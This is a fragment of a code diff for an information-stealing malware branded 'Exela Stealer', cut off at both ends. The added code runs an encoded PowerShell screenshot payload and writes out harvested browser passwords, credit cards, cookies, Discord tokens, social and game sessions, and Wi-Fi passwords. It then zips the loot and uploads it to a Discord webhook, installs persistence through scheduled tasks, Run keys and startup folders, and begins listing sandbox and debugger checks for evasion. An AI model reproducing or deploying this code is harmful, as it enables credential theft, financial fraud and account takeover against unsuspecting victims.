CAG8AdQBuAGQAcwA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHUAcwBpAG4AZwAgACgAQgBpAHQAbQBhAHAAIABiAGkAdABtAGEAcAAgAD0AIABuAGUAdwAgAEIAaQB0AG0AYQBwACgAYgBvAHUAbgBkAHMALgBXAGkAZAB0AGgALAAgAGIAbwB1AG4AZABzAC4ASABlAGkAZwBoAHQAKQApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB1AHMAaQBuAGcAIAAoAEcAcgBhAHAAaABpAGMAcwAgAGcAcgBhAHAAaABpAGMAcwAgAD0AIABHAHIAYQBwAGgAaQBjAHMALgBGAHIAbwBtAEkAbQBhAGcAZQAoAGIAaQB0AG0AYQBwACkAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGcAcgBhAHAAaABpAGMAcwAuAEMAbwBwAHkARgByAG8AbQBTAGMAcgBlAGUAbgAoAG4AZQB3ACAAUABvAGkAbgB0ACgAYgBvAHUAbgBkAHMALgBMAGUAZgB0ACwAIABiAG8AdQBuAGQAcwAuAFQAbwBwACkALAAgAFAAbwBpAG4AdAAuAEUAbQBwAHQAeQAsACAAYgBvAHUAbgBkAHMALgBTAGkAegBlACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcgBlAHMAdQBsAHQAcwAuAEEAZABkACgAKABCAGkAdABtAGEAcAApAGIAaQB0AG0AYQBwAC4AQwBsAG8AbgBlACgAKQApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwBhAHQAYwBoACAAKABFAHgAYwBlAHAAdABpAG8AbgApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC8ALwAgAEgAYQBuAGQAbABlACAAYQBuAHkAIABlAHgAYwBlAHAAdABpAG8AbgBzACAAaABlAHIAZQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAcgBlAHQAdQByAG4AIAByAGUAcwB1AGwAdABzADsADQAKACAAIAAgACAAfQANAAoAfQANAAoAIgBAAA0ACgANAAoAQQBkAGQALQBUAHkAcABlACAALQBUAHkAcABlAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAHMAbwB1AHIAYwBlACAALQBSAGUAZgBlAHIAZQBuAGMAZQBkAEEAcwBzAGUAbQBiAGwAaQBlAHMAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALAAgAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwANAAoADQAKACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzACAAPQAgAFsAUwBjAHIAZQBlAG4AcwBoAG8AdABdADoAOgBDAGEAcAB0AHUAcgBlAFMAYwByAGUAZQBuAHMAKAApAA0ACgANAAoADQAKAGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQAcwAuAEMAbwB1AG4AdAA7ACAAJABpACsAKwApAHsADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0ACAAPQAgACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzAFsAJABpAF0ADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0AC4AUwBhAHYAZQAoACIALgAvAEQAaQBzAHAAbABhAHkAIAAoACQAKAAkAGkAKwAxACkAKQAuAHAAbgBnACIAKQANAAoAIAAgACAAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQALgBEAGkAcwBwAG8AcwBlACgAKQANAAoAfQA=" # Unicode encoded command
+            process = await asyncio.create_subprocess_shell(f"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand {command}",cwd=filePath,shell=True)
+            await process.communicate() 
+            if self.processList:
+                with open(os.path.join(filePath, "process_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
+                    file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    for proc in self.processList:
+                        file.write(proc)
+            if self.lastCipboardList:
+                with open(os.path.join(filePath, "last_clipboard.txt"), "a", encoding="utf-8", errors="ignore") as file:
+                    file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    for lstclip in self.lastCipboardList:
+                        file.write(lstclip)
+            if self.FirefoxCookieList:
+                with open(os.path.join(filePath, "Browsers", "Firefox", "Cookies.txt"), "a", encoding="utf-8", errors="ignore") as file:
+                    file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    for fcookie in self.FirefoxCookieList:
+                        file.write(fcookie)
+            if self.FirefoxHistoryList:
+                with open(os.path.join(filePath, "Browsers", "Firefox", "History.txt"), "a", encoding="utf-8", errors="ignore") as file:
+                    file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    for fhistory in self.FirefoxHistoryList:
+                        file.write(fhistory)
+            if self.FirefoxAutofiList:
+                with open(os.path.join(filePath, "Browsers", "Firefox", "Autofills.txt"), "a", encoding="utf-8", errors="ignore") as file:
+                    file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    for fautofill in self.FirefoxAutofiList:
+                        file.write(fautofill)
+            if self.password_list:
+                with open(os.path.join(filePath, "Browsers", "Passwords.txt"), "a", encoding="utf-8", errors="ignore") as file:
+                    file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    for passwords in self.password_list:
+                        file.write(passwords)
+            if self.card_list:
+                with open(os.path.join(filePath, "Browsers", "Cards.txt"), "a", encoding="utf-8", errors="ignore") as file:
+                    file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    for cards in self.card_list:
+                        file.write(cards)
+            if self.cookie_list:
+                with open(os.path.join(filePath, "Browsers", "Cookies.txt"), "a", encoding="utf-8", errors="ignore") as file:
+                    file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    for cookies in self.cookie_list:
+                        file.write(cookies)
+            if self.history_list:
+                with open(os.path.join(filePath, "Browsers", "Historys.txt"), "a", encoding="utf-8", errors="ignore") as file:
+                    file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    for historys in self.history_list:
+                        file.write(historys)
+            if self.download_list:
+                with open(os.path.join(filePath, "Browsers", "Autofills.txt"), "a", encoding="utf-8", errors="ignore") as file:
+                    file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    for autofill in self.autofill_list:
+                        file.write(autofill)
+            if self.bookmark_list:
+                with open(os.path.join(filePath, "Browsers", "Bookmarks.txt"), "a", encoding="utf-8", errors="ignore") as file:
+                    file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    for bookmark in self.bookmark_list:
+                        file.write(bookmark)           
+            if self.download_list:
+                with open(os.path.join(filePath, "Browsers", "Downloads.txt"), "a", encoding="utf-8", errors="ignore") as file:
+                    file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    for downloads in self.download_list:
+                        file.write(downloads)
+            if self.riotGamesSessionList:
+                with open(os.path.join(filePath, "Sessions", "riot_games.txt"), "a", encoding="utf-8", errors="ignore") as file:
+                    file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    for riotgames in self.riotGamesSessionList:
+                        file.write(riotgames)
+            if self.instagramSessionList:
+                with open(os.path.join(filePath, "Sessions", "instagram_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
+                    file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    for insta in self.instagramSessionList:
+                        file.write(insta)
+            if self.tiktokSessionList:
+                with open(os.path.join(filePath, "Sessions", "tiktok_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
+                    file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    for tiktok in self.tiktokSessionList:
+                        file.write(tiktok)
+            if self.twitterSessionList:
+                with open(os.path.join(filePath, "Sessions", "twitter_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
+                    file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    for twitter in self.twitterSessionList:
+                        file.write(twitter)
+            if self.redditSessionList:
+                with open(os.path.join(filePath, "Sessions", "reddit_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
+                    file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    for reddit in self.redditSessionList:
+                        file.write(reddit)
+            if self.twitchSessionList:
+                with open(os.path.join(filePath, "Sessions", "twitch_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
+                    file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    for twitch in self.twitchSessionList:
+                        file.write(twitch)
+            if self.spotifySessionList:
+                with open(os.path.join(filePath, "Sessions", "spotify_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
+                    file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    for spotify in self.spotifySessionList:
+                        file.write(spotify)
+            if self.robloxSessionList:
+                with open(os.path.join(filePath, "Sessions", "roblox_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
+                    file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    for roblox in self.robloxSessionList:
+                        file.write(roblox)
+            if self.steamSessionList:
+                with open(os.path.join(filePath, "Sessions", "steam_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
+                    file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    for steam in self.steamSessionList:
+                        file.write(steam)
+            if self.discordAccountList:
+                with open(os.path.join(filePath, "Tokens", "discord_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
+                    file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    for discord in self.discordAccountList:
+                        file.write(discord)
+            if self.full_tokens:
+                with open(os.path.join(filePath, "Tokens", "full_tokens.txt"), "a", encoding="utf-8", errors="ignore") as file:
+                    file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    for token in self.full_tokens:
+                        file.write(token + "\n")    
+            if self.validated_tokens:
+                with open(os.path.join(filePath, "Tokens", "validated_tokens.txt"), "a", encoding="utf-8", errors="ignore") as file:
+                    file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    for validated_token in self.validated_tokens:
+                        file.write(validated_token + "\n")   
+            if self.wifiList:
+                with open(os.path.join(filePath, "wifi_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
+                    file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    for profile_name, profile_password in self.wifiList:
+                        file.write(f"WiFi Profile: {str(profile_name)}\nPassword: {str(profile_password)}\n\n")
+            if self.systeminfoList:
+                with open(os.path.join(filePath, "system_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
+                    file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    for sysmteminfo in self.systeminfoList:
+                        file.write(str(sysmteminfo))
+            if self.NetworkList:
+                with open(os.path.join(filePath, "network_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
+                    file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    for ip, country,city, timezone, isp in self.NetworkList:
+                        file.write(ip + "\n" + country + "\n" + city +"\n" + timezone + "\n" + isp) 
+        except:pass
+    async def SendContains(self) -> None:
+        try:
+            cookie_keys = ""
+            password_keys = ""
+            autofill_keys = ""
+            keywords = ["gmail.com", "live.com", "zoho.com", "tutanota.com", "trashmail.com", "gmx.net", "safe-mail.net", "thunderbird.net", "mail.lycos.com",    "hushmail.com", "mail.aol.com", "icloud.com", "protonmail.com", "fastmail.com", "rackspace.com", "1and1.com", "mailbox.org", "mail.yandex.com", "titan.email", "youtube.com", "nulled.to", "cracked.to", "tiktok.com", "yahoo.com", "gmx.com", "aol.com", "coinbase", "mail.ru", "rambler.ru", "gamesense.pub", "neverlose.cc",    "onetap.com", "fatality.win", "vape.gg", "binance", "ogu.gg", "lolz.guru", "xss.is", "g2g.com", "igvault.com", "plati.ru", "minecraft.net", "primordial.dev",    "vacban.wtf", "instagram.com", "mail.ee", "hotmail.com", "facebook.com", "vk.ru", "x.synapse.to", "hu2.app", "shoppy.gg", "app.sell", "sellix.io", "gmx.de",    "riotgames.com", "mega.nz", "roblox.com", "exploit.in", "breached.to", "v3rmillion.net", "hackforums.net", "0x00sec.org", "unknowncheats.me", "godaddy.com","accounts.google.com", "aternos.org", "namecheap.com", "hostinger.com", "bluehost.com", "hostgator.com", "siteground.com", "netafraz.com", "iranserver.com","ionos.com", "whois.com", "te.eg", "vultr.com", "mizbanfa.net", "neti.ee", "osta.ee", "cafe24.com", "wpengine.com", "parspack.com", "cloudways.com", "inmotionhosting.com","hinet.net", "mihanwebhost.com", "mojang.com", "phoenixnap.com", "dreamhost.com", "rackspace.com", "name.com", "alibabacloud.com", "a2hosting.com", "contabo.com","xinnet.com", "7ho.st", "hetzner.com", "domain.com", "west.cn", "iranhost.com", "yisu.com", "ovhcloud.com", "000webhost.com", "reg.ru", "lws.fr", "home.pl",    "sakura.ne.jp", "matbao.net", "scalacube.com", "telia.ee", "estoxy.com", "zone.ee", "veebimajutus.ee", "beehosting.pro", "core.eu", "wavecom.ee", "iphoster.net",    "cspacehostings.com", "zap-hosting.com", "iceline.com", "zaphosting.com", "cubes.com", "chimpanzeehost.com", "fatalityservers.com", "craftandsurvive.com", "mcprohosting.com",    "shockbyte.com", "ggservers.com", "scalacube.com", "apexminecrafthosting.com", "nodecraft.com", "sparkedhost.com", "pebblehost.com", "ramshard.com", "linkvertise.com",    "adf.ly", "spotify.com", "tv3play.ee", "clarity.tk", "messenger.com", "snapchat.com", "boltfood.eu", "stuudium.com", "ekool.eu", "steamcommunity.com", "epicgames.com",    "0x00sec.org", "greysec.net", "twitter.com", "reddit.com", "amazon.com", "redengine.eu", "eulencheats.com", "4netplayers.com", "velia.net", "bybit.com", "coinbase.com",    "ftx.com", "ftx.us", "binance.us", "bitfinex.com", "kraken.com", "bitstamp.net", "bittrex.com", "kucoin.com", "cex.io", "gemini.com", "blockfi.com", "nexo.io",    "nordvpn.com", "surfshark.com", "privateinternetaccess.com", "netflix.com", "play.tv3.ee", ".ope.ee", "astolfo.lgbt", "intent.store", "novoline.wtf", "flux.today",    "moonx.gg", "novoline.lol", "twitch.tv"]
+            for c in keywords:
+                found_autofill = False 
+                found_passw = False  
+                found_cookie = False
+                for auts in self.autofill_list:
+                    if c in auts:
+                        found_autofill = True  
+                        break  
+                
+                for pssw in self.password_list:
+                    if c in pssw:
+                        found_passw = True  
+                        break  
+                
+                for cooks in self.cookie_list:
+                    if c in cooks:
+                        found_cookie = True
+                        break  
+
+                if found_autofill:
+                    autofill_keys += c + ", "  
+                
+                if found_passw:
+                    password_keys += c + ", "  
+                
+                if found_cookie:
+                    cookie_keys += c + ", "
+            if not cookie_keys:
+                cookie_keys = None
+            if not password_keys:
+                password_keys = None
+            if not autofill_keys:
+                autofill_keys = None
+
+            embed_data = {
+                "title": "***Exela Stealer***",
+                "description": f"***Keyword Result***",
+                "url" : "https://t.me/ExelaStealer",
+                "color": 0,
+                "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd"},
+                "thumbnail": {"url": "https://media.discordapp.net/attachments/1133692440029700117/1140245373496074270/195198d656ec1e2b59a6a823bb250272.jpg?width=489&height=468"}}
+            fields = [
+                {"name": "Passwords", "value": "```" + str(password_keys) + "```", "inline": False},
+                {"name": "Autofills", "value": "```" +  str(autofill_keys) + "```", "inline": False},
+                {"name": "Cookies", "value": "```" + str(cookie_keys) + "```", "inline": False},]
+            embed_data["fields"] = fields
+            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                 payload = {
-                    'file': (self.output_file, file)
-                }
-                response = requests.post(self.webhook_url, files=payload)
-                if response.status_code == 200:
-                    print("log send succesfully.")
-                else:
-                    print("log cant send.")
-                self.total_keys = 0
-                with open(self.output_file, 'w',encoding="utf-8", errors="ignore") as file:
-                    file.write("") # clear logs
-    def start_logging(self):
-        with keyboard.Listener(on_press=self.on_key_press) as listener:
-            listener.join()
-class HardAntiVM:
+                    "username": "Exela Stealer",
+                    "embeds": [embed_data] }
+                headers = {
+                    "Content-Type": "application/json"}
+                async with session.post(webhook, json=payload, headers=headers) as response:
+                    pass
+        except Exception as e:
+            print(e)
+    async def SendAllData(self) -> None:
+        cmd = "wmic csproduct get uuid"
+        process = await asyncio.create_subprocess_shell(
+                cmd,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE,
+                shell=True
+            )
+            
+        stdout, stderr = await process.communicate()
+        output_lines = stdout.decode(errors="ignore").split("\n")
+        uuid = output_lines[1].strip() if len(output_lines) > 1 else "NONE"
+        filePath:str = os.path.join(self.Temp, uuid)
+        shutil.make_archive(filePath, "zip", filePath)
+        embed_data = {
+            "title": "***Exela Stealer***",
+            "description": f"***Exela Stealer Full Info***",
+            "url" : "https://t.me/ExelaStealer",
+            "color": 0,
+            "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd"},
+            "thumbnail": {"url": "https://media.discordapp.net/attachments/1133692440029700117/1140245373496074270/195198d656ec1e2b59a6a823bb250272.jpg?width=489&height=468"}}
+        fields = [
+             {"name": "Password", "value": "``" + str(len(self.password_list)) + "``", "inline": True},
+             {"name": "Card", "value": "``" + str(len(self.card_list)) + "``", "inline": True},
+             {"name": "Cookie", "value": "``" +  str(len(self.cookie_list) + len(self.FirefoxCookieList)) + "``", "inline": True},
+             {"name": "History", "value": "``" + str(len(self.history_list) + len(self.FirefoxHistoryList)) + "``", "inline": True},
+             {"name": "Download", "value":"``" + str(len(self.download_list)) + "``", "inline": True},
+             {"name": "Bookmark", "value": "``" + str(len(self.bookmark_list)) + "``", "inline": True},
+             {"name": "Autofill", "value": "``" + str(len(self.autofill_list) + len(self.FirefoxAutofiList)) + "``", "inline": True},
+             {"name": "Tokens", "value": "``" + str(len(self.full_tokens)) + "``", "inline": True},
+             {"name": "Instagram", "value": "``" + str(len(self.instagramSessionList)) + "``", "inline": True},
+             {"name": "Twitter", "value": "``" + str(len(self.twitterSessionList)) + "``", "inline": True},
+             {"name": "TikTok", "value": "``" + str(len(self.tiktokSessionList)) + "``", "inline": True},
+             {"name": "Twitch", "value": "``" + str(len(self.twitchSessionList)) + "``", "inline": True},
+             {"name": "Reddit", "value": "``" + str(len(self.redditSessionList)) + "``", "inline": True},
+             {"name": "Spotify", "value": "``" + str(len(self.spotifySessionList)) + "``", "inline": True},
+             {"name": "Riot Game's", "value": "``" + str(len(self.riotGamesSessionList)) + "``", "inline": True},
+             {"name": "Roblox", "value": "``" + str(len(self.robloxSessionList)) + "``", "inline": True},
+             {"name": "Steam", "value": "``" + str(len(self.steamSessionList)) + "``", "inline": True},
+             {"name": "Wifi", "value": "``" + str(len(self.wifiList)) + "``", "inline": True},
+             {"name": "FireFox?", "value": "``" + str(self.FireFox) + "``", "inline": True},]
+        embed_data["fields"] = fields
+        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
+            payload = {
+                "username": "Exela Stealer",
+                "embeds": [embed_data] }
+            headers = {
+                 "Content-Type": "application/json"}
+            async with session.post(webhook, json=payload, headers=headers) as response:
+                pass
+            await self.SendContains()
+            with open(filePath + ".zip", 'rb') as file:
+                dosya_verisi = file.read()
+            payload = aiohttp.FormData()
+            payload.add_field('file', dosya_verisi, filename=os.path.basename(filePath + ".zip"))
+            async with session.post(webhook, data=payload) as f:
+                pass
+class Startup:
     def __init__(self) -> None:
-        if self.is_running_on_vm():
-            print("VM Detected")
-            os._exit(0)
-        else:
-            print("Normal Machine")
-            thread = threading.Thread(target=QuicaxdExela,daemon=True)
-            thread.start()
-            thread.join()
-    def is_running_on_vm(self):
-        detection_methods = [
-            self.normalVM,
-            self.vmcik,
-            self.check_hostname,
-            self.check_processes,
-            self.check_files,
-            self.check_gdb,
-            self.check_hypervisor,
-            self.sandboxie,]
-        for method in detection_methods:
-            if method():
-                print(method)
-                return True
-        return False
-    def check_hostname(self):
+        self.LocalAppData = os.getenv("LOCALAPPDATA")
+        self.RoamingAppData = os.getenv("APPDATA")
+        self.CurrentFile = os.path.abspath(sys.argv[0])
+        self.Privalage:bool = ctypes.windll.shell32.IsUserAnAdmin()
+        self.ToPath:str = os.path.join(self.LocalAppData, "ExelaUpdateService", "Exela.exe")
+    async def main(self) -> None:
+        await self.CreatePathAndMelt()
+        if startup_method == "schtasks":
+            await self.SchtaskStartup()
+        elif startup_method == "regedit":
+            await self.RegeditStartup()
+        elif startup_method == "folder":
+            await self.FolderStartup()
+        else:print("unkown startup method!")
+    async def CreatePathAndMelt(self) -> None:
+        try:
+            if os.path.exists(self.ToPath): # if the startup file already exist, return
+                return
+            else:
+                os.mkdir(self.ToPath.replace("Exela.exe", "")) # Create Directory
+                shutil.copyfile(self.CurrentFile, self.ToPath) # copy to current file to local appdata directory
+                process = await asyncio.create_subprocess_shell(
+                f'attrib +h +s "{self.ToPath}"',
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE,
+                shell=True)
+                await process.communicate() # Melting file and give to system file privilages
+        except Exception as e:
+            print(str(e)) # print error if has error
+    async def SchtaskStartup(self) -> None: # schtask method for startup
+        try:
+            command = await asyncio.create_subprocess_shell(
+                'schtasks /query /TN "ExelaUpdateService"',
+                shell=True,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE)
+            stdout, stderr = await command.communicate() # checking if the file on schtask or not
+            if not stdout: # if the file not on schtasks
+                if self.Privalage: # if the code running on admin privilage, execute the startup command
+                    try:
+                        onLogonCommand = f'schtasks /create /f /sc onlogon /rl highest /tn "ExelaUpdateService" /tr "{self.ToPath}"'
+                        everyOneHour = f'schtasks /create /f /sc hourly /mo 1 /rl highest /tn "ExelaUpdateService2" /tr "{self.ToPath}"'
+                        process = await asyncio.create_subprocess_shell(onLogonCommand, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, shell=True)
+                        await process.communicate()
+                        process2 = await asyncio.create_subprocess_shell(everyOneHour, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, shell=True)
+                        await process2.communicate()
+                    except: # if the moduel cant load try to run the command
+                        pass
+                else: # if code not running on admin privilage, first get admin priv and then execute
+                    result = ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+                    if result > 32: # if the user give the admin req close the normal code for execute the admin priv code
+                        os._exit(0)
+                    else: # if the user not give the admin req
+                        try:
+                            command = f'schtasks /create /f /sc daily /ri 30 /tn "ExelaUpdateService" /tr "{self.ToPath}"'
+                            process = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, shell=True)
+                            await process.communicate()
+                        except:
+                            process = await asyncio.create_subprocess_shell(
+                            f'schtasks /create /f /tn "ExelaUpdateService" /tr "{self.ToPath}" /sc daily /ri 30',
+                            stdout=asyncio.subprocess.PIPE,
+                            stderr=asyncio.subprocess.PIPE,
+                            shell=True)
+                            await process.communicate()
+        except Exception as e:
+            print(str(e)) # print error if has error
+    async def RegeditStartup(self) -> None: # regedit method for startup
+        try:
+            if not self.Privalage: # if the code not running admin privilage, copy to HKCU
+                process = await asyncio.create_subprocess_shell(
+                f'reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Exela Update Service" /t REG_SZ /d "{self.ToPath}" /f',
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE,
+                shell=True)
+                await process.communicate()
+            else: # if the code running admin privilage, copy to HKLM
+                process = await asyncio.create_subprocess_shell(
+                f'reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Exela Update Service" /t REG_SZ /d "{self.ToPath}" /f',
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE,
+                shell=True)
+                await process.communicate()
+        except Exception as e:
+            print(str(e))
+    async def FolderStartup(self): # folder method for startup
+        try:
+            if self.Privalage: #if the code running admin privilage, copy to common startup path
+                if os.path.isfile(r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Exela.exe"):
+                    print("File already on startup!")
+                else:
+                    shutil.copy(self.CurrentFile, r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Exela.exe")
+            else: #if the code not running admin privilage, copy to normal startup path
+                if os.path.isfile(os.path.join(self.RoamingAppData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "Exela.exe")):
+                    print("File already on startup!")
+                else:
+                    shutil.copy(self.CurrentFile, os.path.join(self.RoamingAppData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "Exela.exe"))
+        except Exception as e:
+            print(str(e))
+
+
+class AntiDebug:
+    def __init__(self) -> None:
+        self.banned_uuids = ["7AB5C494-39F5-4941-9163-47F54D6D5016","7204B444-B03C-48BA-A40F-0D1FE2E4A03B","88F1A492-340E-47C7-B017-AAB2D6F6976C","129B5E6B-E368-45D4-80AB-D4F106495924","8F384129-F079-456E-AE35-16608E317F4F","E6833342-780F-56A2-6F92-77DACC2EF8B3", "032E02B4-0499-05C3-0806-3C0700080009", "03DE0294-0480-05DE-1A06-350700080009", "11111111-2222-3333-4444-555555555555", "71DC2242-6EA2-C40B-0798-B4F5B4CC8776", "6F3CA5EC-BEC9-4A4D-8274-11168F640058", "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548", "4C4C4544-0050-3710-8058-CAC04F59344A", "00000000-0000-0000-0000-AC1F6BD04972","00000000-0000-0000-0000-AC1F6BD04C9E", "00000000-0000-0000-0000-000000000000", "5BD24D56-789F-8468-7CDC-CAA7222CC121", "49434D53-0200-9065-2500-65902500E439", "49434D53-0200-9036-2500-36902500F022", "777D84B3-88D1-451C-93E4-D235177420A7", "49434D53-0200-9036-2500-369025000C65",
+                            "B1112042-52E8-E25B-3655-6A4F54155DBF", "00000000-0000-0000-0000-AC1F6BD048FE", "EB16924B-FB6D-4FA1-8666-17B91F62FB37", "A15A930C-8251-9645-AF63-E45AD728C20C", "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3", "C7D23342-A5D4-68A1-59AC-CF40F735B363", "63203342-0EB0-AA1A-4DF5-3FB37DBB0670", "44B94D56-65AB-DC02-86A0-98143A7423BF", "6608003F-ECE4-494E-B07E-1C4615D1D93C", "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A", "49434D53-0200-9036-2500-369025003AF0", "8B4E8278-525C-7343-B825-280AEBCD3BCB", "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27", "79AF5279-16CF-4094-9758-F88A616D81B4"]
+        self.banned_computer_names = ["WDAGUtilityAccount","Harry Johnson","JOANNA","WINZDS-21T43RNG", "Abby", "Peter Wilson", "hmarc", "patex", "JOHN-PC", "RDhJ0CNFevzX", "kEecfMwgj", "Frank",
+                            "8Nl0ColNQ5bq", "Lisa", "John", "george", "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A", "lmVwjj9b", "PqONjHVwexsS", "3u2v9m8", "Julia", "HEUeRzl", "BEE7370C-8C0C-4", "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM", "DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "JOHN-PC",
+                            "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R","COMPNAME_4491", "WILEYPC", "WORK","KATHLROGE","DESKTOP-TKGQ6GH", "6C4E733F-C2D9-4", "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC","DESKTOP-NNSJYNR", "JULIA-PC","DESKTOP-BQISITB", "d1bnJkfVlH"]
+        self.banned_process = ["HTTP Toolkit.exe", "httpdebuggerui.exe","wireshark.exe", "fiddler.exe", "regedit.exe", "taskmgr.exe", "vboxservice.exe", "df5serv.exe", "processhacker.exe", "vboxtray.exe", "vmtoolsd.exe", "vmwaretray.exe", "ida64.exe", "ollydbg.exe",
